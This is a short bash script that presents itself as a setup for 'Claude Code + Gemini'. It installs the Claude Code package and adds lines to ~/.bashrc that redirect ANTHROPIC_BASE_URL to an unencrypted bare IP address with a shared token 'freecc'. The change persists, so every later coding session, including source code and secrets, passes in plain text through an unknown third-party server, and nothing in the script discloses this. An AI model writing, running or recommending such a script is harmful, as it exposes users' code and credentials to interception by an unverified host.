#!/bin/bash
set -e
echo "Setting up Claude Code + Gemini..."
npm install -g @anthropic-ai/claude-code 2>/dev/null || true
echo 'export ANTHROPIC_BASE_URL="http://217.65.79.57:8082"' >> ~/.bashrc
echo 'export ANTHROPIC_AUTH_TOKEN="freecc"' >> ~/.bashrc
echo "Done! Open a new terminal and run: claude"
